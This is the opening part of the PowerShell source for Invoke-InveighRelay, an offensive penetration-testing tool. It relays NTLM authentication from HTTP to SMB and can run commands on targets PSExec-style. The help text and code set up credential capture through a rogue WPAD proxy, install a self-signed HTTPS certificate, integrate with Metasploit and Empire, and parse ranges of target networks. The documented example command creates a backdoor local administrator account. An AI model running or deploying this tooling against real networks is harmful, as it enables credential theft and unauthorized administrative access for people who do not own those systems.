function Invoke-InveighRelay
{
<#
.SYNOPSIS
This function performs NTLMv1/NTLMv2 HTTP to SMB relay.

.DESCRIPTION
This function performs NTLMv1/NTLMv2 HTTP to SMB relay.

.PARAMETER Attack
Default = Enumerate,Session: (Enumerate/Execute/Session) Comma seperated list of attacks to perform with relay. Enumerate
leverages relay to perform enumeration on target systems. The collected data is used for target selection.
Execute performs PSExec style command execution. Session creates and maintains authenticated SMB sessions that
can be interacted with through Invoke-TheHash's Invoke-SMBClient, Invoke-SMBEnum, and Invoke-SMBExec. 

.PARAMETER Challenge
Default = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random
challenge will be generated for each request. Note that during SMB relay attempts, the challenge will be
pulled from the SMB relay target. 

.PARAMETER Command
Command to execute on SMB relay target. Use PowerShell character escapes where necessary.

.PARAMETER ConsoleOutput
Default = Disabled: (Low/Medium/Y/N) Enable/Disable real time console output. If using this option through a
shell, test to ensure that it doesn't hang the shell. Medium and Low can be used to reduce output.

.PARAMETER ConsoleQueueLimit
Default = Unlimited: Maximum number of queued up console log entries when not using the real time console.

.PARAMETER ConsoleStatus
(Integer) Interval in minutes for displaying all unique captured hashes and credentials. This is useful for
displaying full capture lists when running through a shell that does not have access to the support functions.

.PARAMETER ConsoleUnique
Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname,
and username combinations when real time console output is enabled.

.PARAMETER DomainMapping
Array to map one netBIOS domain to one DNS domain. Needed when attacking a domain from a non-domain
attached system with data imported from BloodHound.

.PARAMETER Enumerate
Default = All: (All/Group/NetSession/Share/User) The action that will be used for the 'Enumerate' attack.

.PARAMETER EnumerateGroup
Default = Administrators: The group that will be enumerated with the 'Enumerate' attack. Note that only the
'Administrators' group will be used for targeting decisions.

.PARAMETER FailedLoginStrict
Default = Disabled: If disabled, login attempts against non-domain attached will not count as failed logins. If enabled, all
failed logins will count.

.PARAMETER FailedLoginThreshold
Default = 2: The threshold for failed logins. Once failed logins for a user exceed the threshold, further relay attempts for that
user will be stopped.

.PARAMETER FileOutput
Default = Disabled: (Y/N) Enable/Disable real time file output.

.PARAMETER FileOutputDirectory
Default = Working Directory: Valid path to an output directory for log and capture files. FileOutput must also be
enabled.

.PARAMETER HTTP
Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.

.PARAMETER HTTPIP
Default = Any: IP address for the HTTP/HTTPS listener.

.PARAMETER HTTPPort
Default = 80: TCP port for the HTTP listener.

.PARAMETER HTTPS
Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
the local store. If the script does not exit gracefully, manually remove the certificate. This feature requires
local administrator access.

.PARAMETER HTTPSPort
Default = 443: TCP port for the HTTPS listener.

.PARAMETER HTTPSCertIssuer
Default = Inveigh: The issuer field for the cert that will be installed for HTTPS.

.PARAMETER HTTPSCertSubject
Default = localhost: The subject field for the cert that will be installed for HTTPS.

.PARAMETER HTTPSForceCertDelete
Default = Disabled: (Y/N) Force deletion of an existing certificate that matches HTTPSCertIssuer and
HTTPSCertSubject.

.PARAMETER LogOutput
Default = Enabled: (Y/N) Enable/Disable storing log messages in memory.

.PARAMETER MachineAccounts
Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.

.PARAMETER OutputStreamOnly
Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if
running Inveigh Relay through a shell that does not return other output streams. Note that you will not see the
various yellow warning messages if enabled.

.PARAMETER ProxyIP
Default = Any: IP address for the proxy listener.

.PARAMETER ProxyPort
Default = 8492: TCP port for the proxy listener.

.PARAMETER ProxyIgnore
Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
will not be sent the wpad.dat file used for capturing proxy authentications. Firefox does not work correctly
with the proxy server failover setup. Firefox will be left unable to connect to any sites until the proxy is
cleared. Remove "Firefox" from this list to attack Firefox. If attacking Firefox, consider setting
-SpooferRepeat N to limit attacks against a single target so that victims can recover Firefox connectivity by
closing and reopening.

.PARAMETER RelayAutoDisable
Default = Enable: (Y/N) Enable/Disable automatically disabling SMB relay after a successful command execution on
target.

.PARAMETER RelayAutoExit
Default = Enable: (Y/N) Enable/Disable automatically exiting after a relay is disabled due to success or error.

.PARAMETER RepeatEnumerate
Default = 30 Minutes: The minimum number of minutes to wait between enumeration attempts for a target.

.PARAMETER RepeatExecute
Default = 30 Minutes: The minimum number of minutes to wait between command execution attempts for a target. 

.PARAMETER RunTime
(Integer) Run time duration in minutes.

.PARAMETER Service
Default = 20 Character Random: Name of the service to create and delete on the target.

.PARAMETER SessionLimitPriv
Default = 2: Limit of privileged sessions on a target.

.PARAMETER SessionLimitShare
Default = 2: Limit of sessions per user for targets hosting custom shares.

.PARAMETER SessionLimitUnpriv
Default = 0: Limit of unprivileged sessions on a target.

.PARAMETER SessionRefresh
Default = 10 Minutes: The number of minutes between refreshes to keep sessions from timing out.

.PARAMETER ShowHelp
Default = Enabled: (Y/N) Enable/Disable the help messages at startup.

.PARAMETER StartupChecks
Default = Enabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.

.PARAMETER StatusOutput
Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.

.PARAMETER Target
Comma separated list of IP addresses to target for relay. This parameter will accept single addresses, CIDR, or
ranges on the format of 192.168.0.1-192.168.0.10 or 192.168.0.1-10. Avoid using large ranges with lots of unused
IP addresses or systems not running SMB. Inveigh-Relay will do quick port checks as part of target selection and
filter out invalid targets. Something like a /16 with only a few hosts isn't really practical though.

.PARAMETER TargetExclude
Comma separated list of IP addresses to exlude from the target list. This parameter will accept the same formats as
the 'Target' parameter.

.PARAMETER TargetMode
Default = Random: (Random/Strict) 'Random' target mode will fall back to selecting a random target is a match
isn't found through enumerated data. 'Strict' will only select targets through enumerated data. Note that
'Strict' requires either previously collected data from the 'Enumerate' attack or data imported from
BloodHound.

.PARAMETER TargetRandom
Default = Enabled: (Y/N) Enable/Disable selecting a random target if a target is not found through logic.

.PARAMETER TargetRefresh
Default = 60 Minutes: Number of minutes to wait before rechecking a target for eligibility.

.PARAMETER Tool
Default = 0: (0/1/2) Enable/Disable features for better operation through external tools such as Meterpreter's
PowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and Empire.
0 = None, 1 = Metasploit/Meterpreter, 2 = Empire 

.PARAMETER Username
Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and
domain\username format. 

.PARAMETER WPADAuth
Default = NTLM: (Anonymous/NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to
Anonymous can prevent browser login prompts.

.PARAMETER WPADAuthIgnore
Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
will be skipped for NTLM authentication. This can be used to filter out browsers like Firefox that display login
popups for authenticated wpad.dat requests such as Firefox.  

.EXAMPLE
Invoke-Inveigh -HTTP N
Invoke-InveighRelay -Target 192.168.2.55 -Command "net user Inveigh Spring2017 /add && net localgroup administrators Inveigh /add"

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>

#region begin parameters

# Parameter default values can be modified in this section:

[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][ValidateSet("Enumerate","Session","Execute")][Array]$Attack = ("Enumerate","Session"),
    [parameter(Mandatory=$false)][ValidateSet("All","NetSession","Share","User","Group")][String]$Enumerate = "All",
    [parameter(Mandatory=$false)][ValidateSet("Random","Strict")][String]$TargetMode = "Random",
    [parameter(Mandatory=$false)][String]$EnumerateGroup = "Administrators",
    [parameter(Mandatory=$false)][Array]$DomainMapping = "",
    [parameter(Mandatory=$false)][Array]$Target = "",
    [parameter(Mandatory=$false)][Array]$TargetExclude = "",
    [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
    [parameter(Mandatory=$false)][Array]$Username = "",
    [parameter(Mandatory=$false)][Array]$WPADAuthIgnore = "",
    [parameter(Mandatory=$false)][Int]$ConsoleQueueLimit = "-1",
    [parameter(Mandatory=$false)][Int]$ConsoleStatus = "",
    [parameter(Mandatory=$false)][Int]$FailedLoginThreshold = "2",
    [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
    [parameter(Mandatory=$false)][Int]$HTTPSPort = "443",
    [parameter(Mandatory=$false)][Int]$ProxyPort = "8492",
    [parameter(Mandatory=$false)][Int]$RunTime = "",
    [parameter(Mandatory=$false)][Int]$SessionLimitPriv = "2",
    [parameter(Mandatory=$false)][Int]$SessionLimitShare = "2",
    [parameter(Mandatory=$false)][Int]$SessionLimitUnpriv = "0",
    [parameter(Mandatory=$false)][Int]$SessionRefresh = "10",
    [parameter(Mandatory=$false)][Int]$TargetRefresh = "60",
    [parameter(Mandatory=$false)][Int]$RepeatEnumerate = "30",
    [parameter(Mandatory=$false)][Int]$RepeatExecute = "30",
    [parameter(Mandatory=$false)][String]$Command = "",
    [parameter(Mandatory=$false)][String]$HTTPSCertIssuer = "Inveigh",
    [parameter(Mandatory=$false)][String]$HTTPSCertSubject = "localhost",
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FailedLoginStrict = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPSForceCertDelete = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LogOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Proxy = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$RelayAutoDisable = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$RelayAutoExit = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SessionPriority = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$ConsoleOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","NTLM")][String]$WPADAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = "",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = "0.0.0.0",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

#endregion
#region begin initialization

if ($invalid_parameter)
{
    Write-Output "[-] $($invalid_parameter) is not a valid parameter."
    throw
}

if($inveigh.relay_running)
{
    Write-Output "[-] Inveigh Relay is already running"
    throw
}

$inveigh_version = "1.501"

if(!$target -and !$inveigh.enumerate)
{
    Write-Output "[-] No enumerated target data, specify targets with -Target"
    throw
}

if($ProxyIP -eq '0.0.0.0')
{

    try
    {
        $proxy_WPAD_IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
    }
    catch
    {
        Write-Output "[-] Error finding proxy IP, specify manually with -ProxyIP"
        throw
    }

}

if($Attack -contains 'Execute' -and !$Command)
{
    Write-Output "[-] -Command required with -Attack Execute"
    throw
}

if($DomainMapping)
{

    if($DomainMapping.Count -ne 2 -or $DomainMapping[0] -like "*.*" -or $DomainMapping[1] -notlike "*.*")
    {
        Write-Output "[-] -DomainMapping format is incorrect"
        throw
    }
    
}

if(!$FileOutputDirectory)
{ 
    $output_directory = $PWD.Path
}
else
{
    $output_directory = $FileOutputDirectory
}

if(!$inveigh)
{
    $global:inveigh = [HashTable]::Synchronized(@{})
    $inveigh.cleartext_list = New-Object System.Collections.ArrayList
    $inveigh.enumerate = New-Object System.Collections.ArrayList
    $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
    $inveigh.log = New-Object System.Collections.ArrayList
    $inveigh.kerberos_TGT_list = New-Object System.Collections.ArrayList
    $inveigh.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList
    $inveigh.POST_request_list = New-Object System.Collections.ArrayList
    $inveigh.valid_host_list = New-Object System.Collections.ArrayList
    $inveigh.ADIDNS_table = [HashTable]::Synchronized(@{})
    $inveigh.relay_privilege_table = [HashTable]::Synchronized(@{})
    $inveigh.relay_failed_login_table = [HashTable]::Synchronized(@{})
    $inveigh.relay_history_table = [HashTable]::Synchronized(@{})
    $inveigh.request_table = [HashTable]::Synchronized(@{})
    $inveigh.session_socket_table = [HashTable]::Synchronized(@{})
    $inveigh.session_table = [HashTable]::Synchronized(@{})
    $inveigh.session_message_ID_table = [HashTable]::Synchronized(@{})
    $inveigh.session_lock_table = [HashTable]::Synchronized(@{})
    $inveigh.SMB_session_table = [HashTable]::Synchronized(@{})
    $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})
    $inveigh.group_table = [HashTable]::Synchronized(@{})
    $inveigh.session_count = 0
    $inveigh.session = @()
}

$inveigh.stop = $false

if(!$inveigh.running)
{
    $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
    $inveigh.console_queue = New-Object System.Collections.ArrayList
    $inveigh.log_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    $inveigh.output_queue = New-Object System.Collections.ArrayList
    $inveigh.POST_request_file_queue = New-Object System.Collections.ArrayList
    $inveigh.HTTP_session_table = [HashTable]::Synchronized(@{})
    $inveigh.console_input = $true
    $inveigh.console_output = $false
    $inveigh.file_output = $false
    $inveigh.HTTPS_existing_certificate = $false
    $inveigh.HTTPS_force_certificate_delete = $false
    $inveigh.log_output = $true
    $inveigh.cleartext_out_file = $output_directory + "\Inveigh-Cleartext.txt"
    $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
    $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
    $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
    $inveigh.POST_request_out_file = $output_directory + "\Inveigh-FormInput.txt"
}

if($StartupChecks -eq 'Y')
{

    $firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}

    if($HTTP -eq 'Y')
    {
        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPPort "
    }

    if($HTTPS -eq 'Y')
    {
        $HTTPS_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPSPort "
    }

    if($Proxy -eq 'Y')
    {
        $proxy_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$ProxyPort "
    }

}

$inveigh.relay_running = $true
$inveigh.SMB_relay = $true

if($StatusOutput -eq 'Y')
{
    $inveigh.status_output = $true
}
else
{
    $inveigh.status_output = $false
}

if($OutputStreamOnly -eq 'Y')
{
    $inveigh.output_stream_only = $true
}
else
{
    $inveigh.output_stream_only = $false
}

if($Tool -eq 1) # Metasploit Interactive PowerShell Payloads and Meterpreter's PowerShell Extension
{
    $inveigh.tool = 1
    $inveigh.output_stream_only = $true
    $inveigh.newline = $null
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) # PowerShell Empire
{
    $inveigh.tool = 2
    $inveigh.output_stream_only = $true
    $inveigh.console_input = $false
    $inveigh.newline = $null
    $LogOutput = "N"
    $ShowHelp = "N"

    switch ($ConsoleOutput)
    {

        'Low'
        {
            $ConsoleOutput = "Low"
        }

        'Medium'
        {
            $ConsoleOutput = "Medium"
        }

        default
        {
            $ConsoleOutput = "Y"
        }

    }

}
else
{
    $inveigh.tool = 0
    $inveigh.newline = $null
}

#endregion
#region begin startup messages
$inveigh.output_queue.Add("[*] Inveigh Relay $inveigh_version started at $(Get-Date -format s)") > $null

if($firewall_status)
{
    $inveigh.output_queue.Add("[!] Windows Firewall = Enabled")  > $null
}

if($HTTP -eq 'Y')
{

    if($HTTP_port_check)
    {
        $HTTP = "N"
        $inveigh.output_queue.Add("[-] HTTP Capture/Relay Disabled Due To In Use Port $HTTPPort")  > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] HTTP Capture/Relay = Enabled")  > $null

        if($HTTPIP)
        {
            $inveigh.output_queue.Add("[+] HTTP IP Address = $HTTPIP") > $null
        }

        if($HTTPPort -ne 80)
        {
            $inveigh.output_queue.Add("[+] HTTP Port = $HTTPPort") > $null
        }
    }

}
else
{
    $inveigh.output_queue.Add("[+] HTTP Capture/Relay = Disabled")  > $null
}

if($HTTPS -eq 'Y')
{

    if($HTTPS_port_check)
    {
        $HTTPS = "N"
        $inveigh.HTTPS = $false
        $inveigh.output_queue.Add("[-] HTTPS Capture/Relay Disabled Due To In Use Port $HTTPSPort")  > $null
    }
    else
    {

        try
        {
            $inveigh.certificate_issuer = $HTTPSCertIssuer
            $inveigh.certificate_CN = $HTTPSCertSubject
            $inveigh.output_queue.Add("[+] HTTPS Certificate Issuer = " + $inveigh.certificate_issuer)  > $null
            $inveigh.output_queue.Add("[+] HTTPS Certificate CN = " + $inveigh.certificate_CN)  > $null
            $certificate_check = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -match $inveigh.certificate_issuer})

            if(!$certificate_check)
            {
                # credit to subTee for cert creation code from Interceptor
                $certificate_distinguished_name = new-object -com "X509Enrollment.CX500DistinguishedName"
                $certificate_distinguished_name.Encode( "CN=" + $inveigh.certificate_CN, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $certificate_issuer_distinguished_name = new-object -com "X509Enrollment.CX500DistinguishedName"
                $certificate_issuer_distinguished_name.Encode("CN=" + $inveigh.certificate_issuer, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $certificate_key = new-object -com "X509Enrollment.CX509PrivateKey"
                $certificate_key.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider"
                $certificate_key.KeySpec = 2
                $certificate_key.Length = 2048
			    $certificate_key.MachineContext = 1
                $certificate_key.Create()
                $certificate_server_auth_OID = new-object -com "X509Enrollment.CObjectId"
			    $certificate_server_auth_OID.InitializeFromValue("1.3.6.1.5.5.7.3.1")
			    $certificate_enhanced_key_usage_OID = new-object -com "X509Enrollment.CObjectIds.1"
			    $certificate_enhanced_key_usage_OID.add($certificate_server_auth_OID)
			    $certificate_enhanced_key_usage_extension = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
			    $certificate_enhanced_key_usage_extension.InitializeEncode($certificate_enhanced_key_usage_OID)
			    $certificate = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
			    $certificate.InitializeFromPrivateKey(2,$certificate_key,"")
			    $certificate.Subject = $certificate_distinguished_name
			    $certificate.Issuer = $certificate_issuer_distinguished_name
			    $certificate.NotBefore = (get-date).AddDays(-271)
			    $certificate.NotAfter = $certificate.NotBefore.AddDays(824)
			    $certificate_hash_algorithm_OID = New-Object -ComObject X509Enrollment.CObjectId
			    $certificate_hash_algorithm_OID.InitializeFromAlgorithmName(1,0,0,"SHA256")
			    $certificate.HashAlgorithm = $certificate_hash_algorithm_OID
                $certificate.X509Extensions.Add($certificate_enhanced_key_usage_extension)
                $certificate_basic_constraints = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
			    $certificate_basic_constraints.InitializeEncode("true",1)
                $certificate.X509Extensions.Add($certificate_basic_constraints)
                $certificate.Encode()
                $certificate_enrollment = new-object -com "X509Enrollment.CX509Enrollment"
			    $certificate_enrollment.InitializeFromRequest($certificate)
			    $certificate_data = $certificate_enrollment.CreateRequest(0)
                $certificate_enrollment.InstallResponse(2,$certificate_data,0,"")
                $inveigh.certificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -match $inveigh.certificate_issuer})
                $inveigh.HTTPS = $true
                $inveigh.output_queue.Add("[+] HTTPS Capture/Relay = Enabled")  > $null
            }
            else
            {

                if($HTTPSForceCertDelete -eq 'Y')
                {
                    $inveigh.HTTPS_force_certificate_delete = $true
                }

                $inveigh.HTTPS_existing_certificate = $true
                $inveigh.output_queue.Add("[+] HTTPS Capture = Using Existing Certificate")  > $null
            }

        }
        catch
        {
            $HTTPS = "N"
            $inveigh.HTTPS = $false
            $inveigh.output_queue.Add("[-] HTTPS Capture/Relay Disabled Due To Certificate Error")  > $null
        }

    }

}
else
{
    $inveigh.output_queue.Add("[+] HTTPS Capture/Relay = Disabled")  > $null
}

if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
{

    if($Challenge)
    {
        $inveigh.output_queue.Add("[+] HTTP NTLM Challenge = $Challenge")  > $null
    }

    if($MachineAccounts -eq 'N')
    {
        $inveigh.output_queue.Add("[+] Machine Account Capture = Disabled") > $null
        $inveigh.machine_accounts = $false
    }
    else
    {
        $inveigh.machine_accounts = $true
    }

    $inveigh.output_queue.Add("[+] WPAD Authentication = $WPADAuth") > $null

    if($WPADAuth -eq "NTLM")
    {
        $WPADAuthIgnore = ($WPADAuthIgnore | Where-Object {$_ -and $_.Trim()})

        if($WPADAuthIgnore.Count -gt 0)
        {
            $inveigh.output_queue.Add("[+] WPAD NTLM Authentication Ignore List = " + ($WPADAuthIgnore -join ","))  > $null
        }

    }

}

if($Proxy -eq 'Y')
{

    if($proxy_port_check)
    {
        $HTTP = "N"
        $inveigh.output_queue.Add("[+] Proxy Capture/Relay Disabled Due To In Use Port $ProxyPort")  > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] Proxy Capture/Relay = Enabled")  > $null
        $inveigh.output_queue.Add("[+] Proxy Port = $ProxyPort") > $null
        $ProxyPortFailover = $ProxyPort + 1
        $WPADResponse = "function FindProxyForURL(url,host){return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_WPAD_IP`:$ProxyPortFailover; DIRECT`";}"
        $ProxyIgnore = ($ProxyIgnore | Where-Object {$_ -and $_.Trim()})

        if($ProxyIgnore.Count -gt 0)
        {
            $inveigh.output_queue.Add("[+] Proxy Ignore List = " + ($ProxyIgnore -join ","))  > $null
        }

    }

}

if($DomainMapping)
{
    $inveigh.output_queue.Add("[+] Domain Mapping = " + ($DomainMapping -join ","))  > $null
    $inveigh.netBIOS_domain = $DomainMapping[0]
    $inveigh.DNS_domain = $DomainMapping[1]
}

$inveigh.output_queue.Add("[+] Relay Attack = " + ($Attack -join ",")) > $null

# math taken from https://gallery.technet.microsoft.com/scriptcenter/List-the-IP-addresses-in-a-60c5bb6b

function Convert-RangetoIPList
{
    param($IP,$CIDR,$Start,$End)

    function Convert-IPtoINT64
    { 
        param($IP) 
        
        $octets = $IP.split(".")

        return [int64]([int64]$octets[0] * 16777216 + [int64]$octets[1]*65536 + [int64]$octets[2] * 256 + [int64]$octets[3]) 
    } 
    
    function Convert-INT64toIP
    { 
        param ([int64]$int) 
        return (([math]::truncate($int/16777216)).tostring() + "." +([math]::truncate(($int%16777216)/65536)).tostring() + "." + ([math]::truncate(($int%65536)/256)).tostring() + "." +([math]::truncate($int%256)).tostring())
    }

    $target_list = New-Object System.Collections.ArrayList
    
    if($IP)
    {
        $IP_address = [System.Net.IPAddress]::Parse($IP)
    }

    if($CIDR)
    {
        $mask_address = [System.Net.IPAddress]::Parse((Convert-INT64toIP -int ([convert]::ToInt64(("1" * $CIDR + "0" * (32 - $CIDR)),2))))
    }

    if($IP)
    {
        $network_address = New-Object System.Net.IPAddress ($mask_address.address -band $IP_address.address)
    }

    if($IP)
    {
        $broadcast_address = New-Object System.Net.IPAddress (([System.Net.IPAddress]::parse("255.255.255.255").address -bxor $mask_address.address -bor $network_address.address))
    } 
    
    if($IP)
    { 
        $start_address = Convert-IPtoINT64 -ip $network_address.IPAddressToString
        $end_address = Convert-IPtoINT64 -ip $broadcast_address.IPAddressToString
    }
    else
    { 
        $start_address = Convert-IPtoINT64 -ip $start 
        $end_address = Convert-IPtoINT64 -ip $end 
    } 
    
    for($i = $start_address; $i -le $end_address; $i++) 
    { 
        $IP_address = Convert-INT64toIP -int $i
        $target_list.Add($IP_address) > $null
    }

    if($network_address)
    {
        $target_list.Remove($network_address.IPAddressToString)
    }

    if($broadcast_address)
    {
        $target_list.Remove($broadcast_address.IPAddressToString)
    }
    
    return $target_list
}

function Get-TargetList
{
    param($targets)

    $target_list = New-Object System.Collections.ArrayList

    for($i=0;$i -lt $targets.Count;$i++)
    {

        if($targets[$i] -like "*-*")
        {
            $target_array = $targets[$i].split("-")

            if($target_array[0] -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b" -and
            $target_array[1] -notmatch "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")
            {

                if($target_array.Count -ne 2 -or $target_array[1] -notmatch "^[\d]+$" -or $target_array[1] -gt 254)
                {
                    Write-Output "[!] Invalid target $($target[$i])"
                    throw
                }
                else
                {
                    $IP_network_begin = $target_array[0].ToCharArray()
                    [Array]::Reverse($IP_network_begin)
                    $IP_network_begin = -join($IP_network_begin)
                    $IP_network_begin = $IP_network_begin.SubString($IP_network_begin.IndexOf("."))
                    $IP_network_begin = $IP_network_begin.ToCharArray()
                    [Array]::Reverse($IP_network_begin)
                    $IP_network_begin = -join($IP_network_begin)
                    $IP_range_end = $IP_network_begin + $target_array[1]
                    $targets[$i] = $target_array[0] + "-" + $IP_range_end
                }

            }

        }

    }

    ForEach($entry in $targets)
    {
        $entry_split = $null

        if($entry.contains("/"))
        {
            $entry_split = $entry.Split("/")
            $IP = $entry_split[0]
            $CIDR = $entry_split[1]
            [Array]$target_range = Convert-RangetoIPList -IP $IP -CIDR $CIDR
            $target_list.AddRange($target_range)
        }
        elseif($entry.contains("-"))
        {
            $entry_split = $entry.Split("-")

            if($entry_split[0] -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b" -and
            $entry_split[1] -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")
            {
                $start_address = $entry_split[0]
                $end_address = $entry_split[1]
                [Array]$target_range = Convert-RangetoIPList -Start $start_address -End $end_address
                $target_list.AddRange($target_range)
            }
            else
            {
                $target_list.Add($entry) > $null    
            }
            
        }
        else
        {
            $target_list.Add($entry) > $null
        }

    }

    return $target_list
}

if($Target)
{

    if($Target.Count -eq 1)
    {
        $inveigh.output_queue.Add("[+] Relay Target = " + ($Target -join ",")) > $null
    }
    elseif($Target.Count -gt 3)
    {
        $inveigh.output_queue.Add("[+] Relay Targets = " + ($Target[0..2] -join ",") + "...") > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] Relay Targets = " + ($Target -join ",")) > $null
    }

    $inveigh.output_queue.Add("[*] Parsing Relay Target List") > $null
    $inveigh.target_list = New-Object System.Collections.ArrayList
    [Array]$target_range = Get-TargetList $Target
    $inveigh.target_list.AddRange($target_range)
}

if($TargetExclude)
{

    if($TargetExclude.Count -eq 1)
    {
        $inveigh.output_queue.Add("[+] Relay Target Exclude = " + ($TargetExclude -join ",")) > $null
    }
    elseif($TargetExclude.Count -gt 3)
    {
        $inveigh.output_queue.Add("[+] Relay Targets Exclude = " + ($TargetExclude[0..2] -join ",") + "...") > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] Relay Targets Exclude = " + ($TargetExclude -join ",")) > $null
    }

    $inveigh.output_queue.Add("[*] Parsing Relay Target Exclude List") > $null
    $inveigh.target_exclude_list = New-Object System.Collections.ArrayList
    [Array]$target_range = Get-TargetList $TargetExclude
    $inveigh.target_exclude_list.AddRange($TargetExclude)
}

if($Username)
{

    if($Username.Count -eq 1)
    {
        $inveigh.output_queue.Add("[+] Relay Username = " + ($Username -join ",")) > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] Relay Usernames = " + ($Username -join ",")) > $null
    }

}

if($RelayAutoDisable -eq 'Y')
{
    $inveigh.output_queue.Add("[+] Relay Auto Disable = Enabled") > $null
}
else
{
    $inveigh.output_queue.Add("[+] Relay Auto Disable = Disabled") > $null
}

if($RelayAutoExit -eq 'Y')
{
    $inveigh.output_queue.Add("[+] Relay Auto Exit = Enabled") > $null
}
else
{
    $inveigh.output_queue.Add("[+] Relay Auto Exit = Disabled") > $null
}

if($Service)
{
    $inveigh.output_queue.Add("[+] Relay Service = $Service") > $null
}

